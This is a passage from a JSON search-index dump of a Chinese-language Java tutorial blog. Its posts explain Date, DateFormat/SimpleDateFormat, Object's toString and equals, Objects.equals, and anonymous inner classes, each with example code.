Scanner(System.in); System.out.println(\"请输入您的出生日期,格式:yyyy-MM-dd\"); String birthdayDateString = sc.next(); //2.使用DateFormat类中的方法parse,把字符串的出生日期,解析为Date格式的出生日期 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd\"); Date birthdayDate = sdf.parse(birthdayDateString); //3.把Date格式的出生日期转换为毫秒值 long birthdayDateTime = birthdayDate.getTime(); //4.获取当前的日期,转换为毫秒值 long todayTime = new Date().getTime(); //5.使用当前日期的毫秒值-出生日期的毫秒值 long time = todayTime-birthdayDateTime; //6.把毫秒差值转换为天(s/1000/60/60/24) System.out.println(time/1000/60/60/24); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java DateFormat类的format方法和parse方法","slug":"java00138DateFormat类的format方法和parse方法","date":"2020-03-14T06:01:01.000Z","updated":"2020-03-14T17:23:35.961Z","comments":true,"path":"2020/03/14/java00138DateFormat类的format方法和parse方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00138DateFormat类的format方法和parse方法/","excerpt":"","text":"java DateFormat类的format方法和parse方法 java.text.DateFormat:是日期/时间格式化子类的抽象类 作用: 格式化（也就是日期 -&gt; 文本）、解析（文本-&gt; 日期） 成员方法: String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date parse(String source) 把符合模式的字符串,解析为Date日期 DateFormat类是一个抽象类,无法直接创建对象使用,可以使用DateFormat类的子类 java.text.SimpleDateFormat extends DateFormat 构造方法: SimpleDateFormat(String pattern) 用给定的模式和默认语言环境的日期格式符号构造 SimpleDateFormat。 参数: String pattern:传递指定的模式 模式:区分大小写的 y 年 M 月 d 日 H 时 m 分 s 秒 写对应的模式,会把模式替换为对应的日期和时间 “yyyy-MM-dd HH:mm:ss” 注意: 模式中的字母不能更改,连接模式的符号可以改变 “yyyy年MM月dd日 HH时mm分ss秒” 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.itheima.demo03.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class Demo01DateFormat &#123; public static void main(String[] args) throws ParseException &#123; demo02(); &#125; /* 使用DateFormat类中的方法parse,把文本解析为日期 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 注意: public Date parse(String source) throws ParseException parse方法声明了一个异常叫ParseException 如果字符串和构造方法的模式不一样,那么程序就会抛出此异常 调用一个抛出了异常的方法,就必须的处理这个异常,要么throws继续抛出这个异常,要么try catch自己处理 */ private static void demo02() throws ParseException &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 //Date parse(String source) 把符合模式的字符串,解析为Date日期 Date date = sdf.parse(\"2088年08月08日 15时51分54秒\"); System.out.println(date); &#125; /* 使用DateFormat类中的方法format,把日期格式化为文本 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) */ private static void demo01() &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) //String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date date = new Date(); String d = sdf.format(date); System.out.println(date);//Sun Aug 08 15:51:54 CST 2088 System.out.println(d);//2088年08月08日 15时51分54秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java DateFormat类与SimpleDateFormat类介绍","slug":"java00137DateFormat类与SimpleDateFormat类介绍","date":"2020-03-14T00:48:45.000Z","updated":"2020-03-14T00:57:13.679Z","comments":true,"path":"2020/03/14/java00137DateFormat类与SimpleDateFormat类介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00137DateFormat类与SimpleDateFormat类介绍/","excerpt":"","text":"java DateFormat类与SimpleDateFormat类介绍 java.text.DateFormat:是日期/时间格式化子类的抽象类 作用: 格式化（也就是日期 -&gt; 文本）、解析（文本-&gt; 日期） 成员方法: String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date parse(String source) 把符合模式的字符串,解析为Date日期 DateFormat类是一个抽象类,无法直接创建对象使用,可以使用DateFormat类的子类 java.text.SimpleDateFormat extends DateFormat 构造方法: SimpleDateFormat(String pattern) 用给定的模式和默认语言环境的日期格式符号构造 SimpleDateFormat。 参数: String pattern:传递指定的模式 模式:区分大小写的 y 年 M 月 d 日 H 时 m 分 s 秒 写对应的模式,会把模式替换为对应的日期和时间 “yyyy-MM-dd HH:mm:ss” 注意: 模式中的字母不能更改,连接模式的符号可以改变 “yyyy年MM月dd日 HH时mm分ss秒” */ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.itheima.demo03.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class Demo01DateFormat &#123; public static void main(String[] args) throws ParseException &#123; demo02(); &#125; /* 使用DateFormat类中的方法parse,把文本解析为日期 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 注意: public Date parse(String source) throws ParseException parse方法声明了一个异常叫ParseException 如果字符串和构造方法的模式不一样,那么程序就会抛出此异常 调用一个抛出了异常的方法,就必须的处理这个异常,要么throws继续抛出这个异常,要么try catch自己处理 */ private static void demo02() throws ParseException &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 //Date parse(String source) 把符合模式的字符串,解析为Date日期 Date date = sdf.parse(\"2088年08月08日 15时51分54秒\"); System.out.println(date); &#125; /* 使用DateFormat类中的方法format,把日期格式化为文本 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) */ private static void demo01() &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) //String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date date = new Date(); String d = sdf.format(date); System.out.println(date);//Sun Aug 08 15:51:54 CST 2088 System.out.println(d);//2088年08月08日 15时51分54秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Date类的构造方法和成员方法","slug":"java00136Date类的构造方法和成员方法","date":"2020-03-14T00:41:32.000Z","updated":"2020-03-14T00:46:49.094Z","comments":true,"path":"2020/03/14/java00136Date类的构造方法和成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00136Date类的构造方法和成员方法/","excerpt":"","text":"java Date类的构造方法和成员方法 12345678910111213141516171819202122232425262728293031323334353637383940package com.itheima.demo02.Date;import java.util.Date;public class Demo02Date &#123; public static void main(String[] args) &#123; demo03(); &#125; /* long getTime() 把日期转换为毫秒值(相当于System.currentTimeMillis()方法) 返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。 */ private static void demo03() &#123; Date date = new Date(); long time = date.getTime(); System.out.println(time);//3742777636267 &#125; /* Date类的带参数构造方法 Date(long date) :传递毫秒值,把毫秒值转换为Date日期 */ private static void demo02() &#123; Date date = new Date(0L); System.out.println(date);// Thu Jan 01 08:00:00 CST 1970 date = new Date(3742767540068L); System.out.println(date);// Sun Aug 08 09:39:00 CST 2088 &#125; /* Date类的空参数构造方法 Date() 获取当前系统的日期和时间 */ private static void demo01() &#123; Date date = new Date(); System.out.println(date);//Sun Aug 08 12:23:03 CST 2088 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Object与Objects类总结","slug":"java00135Object与Objects类总结","date":"2020-03-14T00:37:43.000Z","updated":"2020-03-18T15:34:55.897Z","comments":true,"path":"2020/03/14/java00135Object与Objects类总结/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00135Object与Objects类总结/","excerpt":"","text":"java Object与Objects类总结 在刚才IDEA自动重写equals代码中，使用到了java.util.Objects类，那么这个类是什么呢？ 在JDK7添加了一个Objects工具类，它提供了一些方法来操作对象，它由一些静态的实用方法组成，这些方法是null-save（空指针安全的）或null-tolerant（容忍空指针的），用于计算对象的hashcode、返回对象的字符串表示形式、比较两个对象。 在比较两个对象的时候，Object的equals方法容易抛出空指针异常，而Objects类中的equals方法就优化了这个问题。方法如下： public static boolean equals(Object a, Object b):判断两个对象是否相等。 我们可以查看一下源码，学习一下： 123public static boolean equals(Object a, Object b) &#123; return (a == b) || (a != null &amp;&amp; a.equals(b)); &#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java毫秒值的概念和作用","slug":"java00134毫秒值的概念和作用","date":"2020-03-13T16:12:30.000Z","updated":"2020-03-13T16:16:30.850Z","comments":true,"path":"2020/03/14/java00134毫秒值的概念和作用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00134毫秒值的概念和作用/","excerpt":"","text":"java毫秒值的概念和作用 java.util.Date: 表示日期和时间的类 类 Date 表示特定的瞬间，精确到毫秒。 毫秒:千分之一秒 1000毫秒=1秒 特定的瞬间:一个时间点,一刹那时间 2088-08-08 09:55:33:333 瞬间 2088-08-08 09:55:33:334 瞬间 2088-08-08 09:55:33:334 瞬间 … 毫秒值的作用: 可以对时间和日期进行计算 2099-01-03 到 2088-01-01 中间一共有多少天 可以日期转换为毫秒进行计算,计算完毕,在把毫秒转换为日期 把日期转换为毫秒: 当前的日期: 2088-01-01 时间原点(0毫秒): 1970 年 1 月 1 日 00:00:00(英国格林威治) 就是计算当前日期到时间原点之间一共经历了多少毫秒 (3742767540068L) 注意: 中国属于东八区,会把时间增加8个小时 1970 年 1 月 1 日 08:00:00 把毫秒转换为日期: 1 天 = 24 × 60 × 60 = 86400 秒 = 86400 x 1000 = 86400000毫秒 1234567package com.itheima.demo02.Date;public class Demo01Date &#123; public static void main(String[] args) &#123; System.out.println(System.currentTimeMillis());//获取当前系统时间到1970 年 1 月 1 日 00:00:00经历了多少毫秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Object类的toString方法","slug":"java00133Object类的toString方法","date":"2020-03-13T16:07:55.000Z","updated":"2020-03-13T16:10:15.376Z","comments":true,"path":"2020/03/14/java00133Object类的toString方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00133Object类的toString方法/","excerpt":"","text":"java Object类的toString方法 ​ java.lang.Object ​ 类 Object 是类层次结构的根(父)类。 ​ 每个类(Person,Student…)都使用 Object 作为超(父)类。 ​ 所有对象（包括数组）都实现这个类的方法。 12345678910111213141516171819202122232425262728293031323334package com.itheima.demo01.Object;import java.util.ArrayList;import java.util.Random;import java.util.Scanner;public class Demo01ToString&#123; public static void main(String[] args) &#123; /* Person类默认继承了Object类,所以可以使用Object类中的toString方法 String toString() 返回该对象的字符串表示。 */ Person p = new Person(\"张三\",18); String s = p.toString(); System.out.println(s);//com.itheima.demo01.Object.Person@75412c2f | abc | Person&#123;name=张三 ,age=18&#125; //直接打印对象的名字,其实就是调用对象的toString p=p.toString(); System.out.println(p);//com.itheima.demo01.Object.Person@5f150435 | abc | Person&#123;name=张三 ,age=18&#125; //看一个类是否重写了toString,直接打印这个类的对象即可,如果没有重写toString方法那么打印的是对象的地址值 Random r = new Random(); System.out.println(r);//java.util.Random@3f3afe78 没有重写toString方法 Scanner sc = new Scanner(System.in); System.out.println(sc);//java.util.Scanner[delimiters=\\p&#123;javaWhitespace&#125;+.. 重写toString方法 ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); System.out.println(list);//[1, 2, 3] 重写toString方法 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaObject类的equals方法2","slug":"java00132Object类的equals方法2","date":"2020-03-13T15:59:19.000Z","updated":"2020-03-13T16:05:16.979Z","comments":true,"path":"2020/03/13/java00132Object类的equals方法2/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00132Object类的equals方法2/","excerpt":"","text":"java Object类的equals方法2 1234567boolean b = s1.equals(s2); // NullPointerException null是不能调用方法的,会抛出空指针异常System.out.println(b);//Objects类的equals方法:对两个对象进行比较,防止空指针异常public static boolean equals(Object a, Object b) &#123;return (a == b) || (a != null &amp;&amp; a.equals(b));&#125; 123456789101112131415package com.itheima.demo01.Object;import java.util.Objects;public class Demo03Objects &#123; public static void main(String[] args) &#123; String s1 = \"abc\"; //String s1 = null; String s2 = \"abc\"; boolean b2 = Objects.equals(s1, s2); System.out.println(b2); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899package com.itheima.demo01.Object;import java.util.Objects;public class Person &#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; /* 直接打印对象的地址值没有意义,需要重写Object类中的toString方法 打印对象的属性(name,age) */ /*@Override public String toString() &#123; //return \"abc\"; return \"Person&#123;name=\"+name+\" ,age=\"+age+\"&#125;\"; &#125;*/ /*@Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125;*/ /* Object类的equals方法,默认比较的是两个对象的地址值,没有意义 所以我们要重写equals方法,比较两个对象的属性(name,age) 问题: 隐含着一个多态 多态的弊端:无法使用子类特有的内容(属性和方法) Object obj = p2 = new Person(\"古力娜扎\",19); 解决:可以使用向下转型(强转)把obj类型转换为Person */ /*@Override public boolean equals(Object obj) &#123; //增加一个判断,传递的参数obj如果是this本身,直接返回true,提高程序的效率 if(obj==this)&#123; return true; &#125; //增加一个判断,传递的参数obj如果是null,直接返回false,提高程序的效率 if(obj==null)&#123; return false; &#125; //增加一个判断,防止类型转换一次ClassCastException if(obj instanceof Person)&#123; //使用向下转型,把obj转换为Person类型 Person p = (Person)obj; //比较两个对象的属性,一个对象是this(p1),一个对象是p(obj-&gt;p2) boolean b = this.name.equals(p.name) &amp;&amp; this.age==p.age; return b; &#125; //不是Person类型直接返回false return false; &#125;*/ @Override public boolean equals(Object o) &#123; if (this == o) return true; //getClass() != o.getClass() 使用反射技术,判断o是否是Person类型 等效于 obj instanceof Person if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java重写Object类的equals方法","slug":"java00131重写Object类的equals方法","date":"2020-03-13T15:50:46.000Z","updated":"2020-03-13T15:56:47.356Z","comments":true,"path":"2020/03/13/java00131重写Object类的equals方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00131重写Object类的equals方法/","excerpt":"","text":"java 重写Object类的equals方法 直接打印对象的地址值没有意义,需要重写Object类中的toString方法 打印对象的属性(name,age) 123456789101112@Override public String toString() &#123; //return \"abc\"; return \"Person&#123;name=\"+name+\" ,age=\"+age+\"&#125;\"; &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; Object类的equals方法,默认比较的是两个对象的地址值,没有意义 所以我们要重写equals方法,比较两个对象的属性(name,age) 问题: 隐含着一个多态 多态的弊端:无法使用子类特有的内容(属性和方法) Object obj = p2 = new Person(&quot;古力娜扎&quot;,19); 解决:可以使用向下转型(强转)把obj类型转换为Person 1234567891011121314151617181920212223@Override public boolean equals(Object obj) &#123; //增加一个判断,传递的参数obj如果是this本身,直接返回true,提高程序的效率 if(obj==this)&#123; return true; &#125; //增加一个判断,传递的参数obj如果是null,直接返回false,提高程序的效率 if(obj==null)&#123; return false; &#125; //增加一个判断,防止类型转换一次ClassCastException if(obj instanceof Person)&#123; //使用向下转型,把obj转换为Person类型 Person p = (Person)obj; //比较两个对象的属性,一个对象是this(p1),一个对象是p(obj-&gt;p2) boolean b = this.name.equals(p.name) &amp;&amp; this.age==p.age; return b; &#125; //不是Person类型直接返回false return false; &#125; 1234567891011121314151617181920212223242526272829303132333435package com.itheima.demo01.Object;import java.util.ArrayList;public class Demo02Equals &#123; public static void main(String[] args) &#123; /* Person类默认继承了Object类,所以可以使用Object类的equals方法 boolean equals(Object obj) 指示其他某个对象是否与此对象“相等”。 equals方法源码: public boolean equals(Object obj) &#123; return (this == obj); &#125; 参数: Object obj:可以传递任意的对象 == 比较运算符,返回的是一个布尔值 true false 基本数据类型:比较的是值 引用数据类型:比价的是两个对象的地址值 this是谁?那个对象调用的方法,方法中的this就是那个对象;p1调用的equals方法所以this就是p1 obj是谁?传递过来的参数p2 this==obj --&gt;p1==p2 */ Person p1 = new Person(\"迪丽热巴\",18); //Person p2 = new Person(\"古力娜扎\",19); Person p2 = new Person(\"迪丽热巴\",18); System.out.println(\"p1:\"+p1);//p1:com.itheima.demo01.Object.Person@58ceff1 System.out.println(\"p2:\"+p2);//p2:com.itheima.demo01.Object.Person@7c30a502 //p1=p2;//把p2的地址值赋值给p1 ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); boolean b = p1.equals(p1); System.out.println(b); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.itheima.demo01.Object;import java.util.Objects;public class Person &#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; //getClass() != o.getClass() 使用反射技术,判断o是否是Person类型 等效于 obj instanceof Person if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaObject类的equals方法","slug":"java00130Object类的equals方法","date":"2020-03-13T15:44:22.000Z","updated":"2020-03-13T15:49:42.885Z","comments":true,"path":"2020/03/13/java00130Object类的equals方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00130Object类的equals方法/","excerpt":"","text":"java Object类的equals方法 Person类默认继承了Object类,所以可以使用Object类的equals方法 boolean equals(Object obj) 指示其他某个对象是否与此对象“相等”。 equals方法源码: 123public boolean equals(Object obj) &#123;return (this == obj);&#125; 参数: Object obj:可以传递任意的对象 ==比较运算符,返回的是一个布尔值true false 基本数据类型:比较的是值 引用数据类型:比价的是两个对象的地址值 this是谁?那个对象调用的方法,方法中的this就是那个对象;p1调用的equals方法所以this就是p1 obj是谁?传递过来的参数p2 this==obj --&gt;p1==p2 1234567891011121314151617181920package com.itheima.demo01.Object;import java.util.ArrayList;public class Demo02Equals &#123; public static void main(String[] args) &#123; Person p1 = new Person(\"迪丽热巴\",18); //Person p2 = new Person(\"古力娜扎\",19); Person p2 = new Person(\"迪丽热巴\",18); System.out.println(\"p1:\"+p1);//p1:com.itheima.demo01.Object.Person@58ceff1 System.out.println(\"p2:\"+p2);//p2:com.itheima.demo01.Object.Person@7c30a502 //p1=p2;//把p2的地址值赋值给p1 ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); boolean b = p1.equals(p1); System.out.println(b); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口作为成员变量类型","slug":"java00128接口作为成员变量类型","date":"2020-03-13T13:34:28.000Z","updated":"2020-03-13T13:38:28.209Z","comments":true,"path":"2020/03/13/java00128接口作为成员变量类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00128接口作为成员变量类型/","excerpt":"","text":"java接口作为成员变量类型 1234567891011121314151617181920212223242526272829303132package cn.itcast.day11.demo07;public class DemoGame &#123; public static void main(String[] args) &#123; Hero hero = new Hero(); hero.setName(\"艾希\"); // 设置英雄的名称 // 设置英雄技能// hero.setSkill(new SkillImpl()); // 使用单独定义的实现类 // 还可以改成使用匿名内部类// Skill skill = new Skill() &#123;// @Override// public void use() &#123;// System.out.println(\"Pia~pia~pia~\");// &#125;// &#125;;// hero.setSkill(skill); // 进一步简化，同时使用匿名内部类和匿名对象 hero.setSkill(new Skill() &#123; @Override public void use() &#123; System.out.println(\"Biu~Pia~Biu~Pia~\"); &#125; &#125;); hero.attack(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940package cn.itcast.day11.demo07;public class Hero &#123; private String name; // 英雄的名称 //使用接口作为成员变量类型 private Skill skill; // 英雄的技能 public Hero() &#123; &#125; public Hero(String name, Skill skill) &#123; this.name = name; this.skill = skill; &#125; public void attack() &#123; System.out.println(\"我叫\" + name + \"，开始施放技能：\"); skill.use(); // 调用接口中的抽象方法 System.out.println(\"施放技能完成。\"); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Skill getSkill() &#123; return skill; &#125; public void setSkill(Skill skill) &#123; this.skill = skill; &#125;&#125; 1234567package cn.itcast.day11.demo07;public interface Skill &#123; void use(); // 释放技能的抽象方法&#125; 12345678package cn.itcast.day11.demo07;public class SkillImpl implements Skill &#123; @Override public void use() &#123; System.out.println(\"Biu~biu~biu~\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口作为方法的参数和或返回值","slug":"java00129接口作为方法的参数和或返回值","date":"2020-03-13T13:34:28.000Z","updated":"2020-03-13T13:44:50.090Z","comments":true,"path":"2020/03/13/java00129接口作为方法的参数和或返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00129接口作为方法的参数和或返回值/","excerpt":"","text":"java接口作为方法的参数和或返回值 1234567891011121314151617181920212223242526272829package cn.itcast.day11.demo07;import java.util.ArrayList;import java.util.List;/*java.util.List正是ArrayList所实现的接口。 */public class DemoInterface &#123; public static void main(String[] args) &#123; // 左边是接口名称，右边是实现类名称，这就是多态写法 List&lt;String&gt; list = new ArrayList&lt;&gt;(); List&lt;String&gt; result = addNames(list); for (int i = 0; i &lt; result.size(); i++) &#123; System.out.println(result.get(i)); &#125; &#125; public static List&lt;String&gt; addNames(List&lt;String&gt; list) &#123; list.add(\"迪丽热巴\"); list.add(\"古力娜扎\"); list.add(\"玛尔扎哈\"); list.add(\"沙扬娜拉\"); return list; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java类作为成员变量类型","slug":"java00127类作为成员变量类型","date":"2020-03-13T13:31:16.000Z","updated":"2020-03-13T13:33:24.331Z","comments":true,"path":"2020/03/13/java00127类作为成员变量类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00127类作为成员变量类型/","excerpt":"","text":"java类作为成员变量类型 123456789101112131415161718192021package cn.itcast.day11.demo06;public class DemoMain &#123; public static void main(String[] args) &#123; // 创建一个英雄角色 Hero hero = new Hero(); // 为英雄起一个名字，并且设置年龄 hero.setName(\"盖伦\"); hero.setAge(20); // 创建一个武器对象 Weapon weapon = new Weapon(\"AK-47\"); // 为英雄配备武器 hero.setWeapon(weapon); // 年龄为20的盖伦用多兰剑攻击敌方。 hero.attack(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package cn.itcast.day11.demo06;// 游戏当中的英雄角色类public class Hero &#123; private String name; // 英雄的名字 private int age; // 英雄的年龄 private Weapon weapon; // 英雄的武器 public Hero() &#123; &#125; public Hero(String name, int age, Weapon weapon) &#123; this.name = name; this.age = age; this.weapon = weapon; &#125; public void attack() &#123; System.out.println(\"年龄为\" + age + \"的\" + name + \"用\" + weapon.getCode() + \"攻击敌方。\"); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public Weapon getWeapon() &#123; return weapon; &#125; public void setWeapon(Weapon weapon) &#123; this.weapon = weapon; &#125;&#125; 123456789101112131415161718192021package cn.itcast.day11.demo06;public class Weapon &#123; private String code; // 武器的代号 public Weapon() &#123; &#125; public Weapon(String code) &#123; this.code = code; &#125; public String getCode() &#123; return code; &#125; public void setCode(String code) &#123; this.code = code; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java匿名内部类的注意事项","slug":"java00126匿名内部类的注意事项","date":"2020-03-13T13:27:51.000Z","updated":"2020-03-13T13:31:48.800Z","comments":true,"path":"2020/03/13/java00126匿名内部类的注意事项/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00126匿名内部类的注意事项/","excerpt":"","text":"java匿名内部类的注意事项 对格式“new 接口名称() {…}”进行解析： new代表创建对象的动作 接口名称就是匿名内部类需要实现哪个接口 {…}这才是匿名内部类的内容 另外还要注意几点问题： 匿名内部类，在【创建对象】的时候，只能使用唯一一次。 如果希望多次创建对象，而且类的内容一样的话，那么就需要使用单独定义的实现类了。 匿名对象，在【调用方法】的时候，只能调用唯一一次。 如果希望同一个对象，调用多次方法，那么必须给对象起个名字。 匿名内部类是省略了【实现类/子类名称】，但是匿名对象是省略了【对象名称】 强调：匿名内部类和匿名对象不是一回事！！！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package cn.itcast.day11.demo05;public class DemoMain &#123; public static void main(String[] args) &#123;// MyInterface obj = new MyInterfaceImpl();// obj.method();// MyInterface some = new MyInterface(); // 错误写法！ // 使用匿名内部类，但不是匿名对象，对象名称就叫objA MyInterface objA = new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-A\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-A\"); &#125; &#125;; objA.method1(); objA.method2(); System.out.println(\"=================\"); // 使用了匿名内部类，而且省略了对象名称，也是匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method1(); // 因为匿名对象无法调用第二次方法，所以需要再创建一个匿名内部类的匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method2(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java匿名内部类","slug":"java00125匿名内部类","date":"2020-03-13T13:23:16.000Z","updated":"2020-03-13T13:27:21.360Z","comments":true,"path":"2020/03/13/java00125匿名内部类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00125匿名内部类/","excerpt":"","text":"如果接口的实现类（或者是父类的子类）只需要使用唯一的一次， 那么这种情况下就可以省略掉该类的定义，而改为使用【匿名内部类】。 匿名内部类的定义格式： 123接口名称 对象名 = new 接口名称() &#123; // 覆盖重写所有抽象方法&#125;; 对格式“new 接口名称() {…}”进行解析： new代表创建对象的动作 接口名称就是匿名内部类需要实现哪个接口 {…}这才是匿名内部类的内容 另外还要注意几点问题： 匿名内部类，在【创建对象】的时候，只能使用唯一一次。 如果希望多次创建对象，而且类的内容一样的话，那么就需要使用单独定义的实现类了。 匿名对象，在【调用方法】的时候，只能调用唯一一次。 如果希望同一个对象，调用多次方法，那么必须给对象起个名字。 匿名内部类是省略了【实现类/子类名称】，但是匿名对象是省略了【对象名称】 强调：匿名内部类和匿名对象不是一回事！！！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package cn.itcast.day11.demo05;public class DemoMain &#123; public static void main(String[] args) &#123;// MyInterface obj = new MyInterfaceImpl();// obj.method();// MyInterface some = new MyInterface(); // 错误写法！ // 使用匿名内部类，但不是匿名对象，对象名称就叫objA MyInterface objA = new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-A\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-A\"); &#125; &#125;; objA.method1(); objA.method2(); System.out.println(\"=================\"); // 